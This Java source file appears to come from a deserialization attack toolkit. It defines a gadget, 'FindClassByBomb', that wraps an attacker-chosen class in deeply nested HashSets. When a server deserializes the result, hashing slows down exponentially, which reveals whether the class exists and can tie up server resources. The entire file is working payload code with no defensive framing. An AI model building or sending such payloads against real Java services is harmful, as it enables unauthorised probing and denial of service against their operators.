package com.xyuxu.javasec.core.payload.gadgets;

import static com.xyuxu.javasec.utils.ProbeUtil.makeProbeClass;

import java.util.HashSet;
import java.util.Set;

public class FindClassByBomb implements ObjectPayload<Object> {

    public Object getObject(final String command) throws Exception {
        int depth;
        String className = null;

        if (command.contains("|")) {
            String[] x = command.split("\\|");
            className = x[0];
            depth = Integer.valueOf(x[1]);
        } else {
            className = command;
            depth = 24;
        }

        Class findClazz;

        try {
            // 1. 尝试直接加载类
            findClazz = Class.forName(className);
        } catch (ClassNotFoundException e) {
            // 2. 如果本地没有这个类，再用 Javassist 伪造一个
            try {
                findClazz = makeProbeClass(className);
            } catch (Exception ex) {
                // 如果 makeClass 还是报错（比如 Javassist 缓存问题），尝试清理后再试，或者直接抛出
                // 这里通常不会进，除非类名非法
                throw new RuntimeException("无法生成探测类: " + className, ex);
            }
        }
        // ======================= 修复结束 =======================

        Set<Object> root = new HashSet<Object>();
        Set<Object> s1 = root;
        Set<Object> s2 = new HashSet<Object>();

        for (int i = 0; i < depth; i++) {
            Set<Object> t1 = new HashSet<Object>();
            Set<Object> t2 = new HashSet<Object>();

            t1.add(findClazz);

            s1.add(t1);
            s1.add(t2);

            s2.add(t1);
            s2.add(t2);
            s1 = t1;
            s2 = t2;
        }
        return root;
    }
}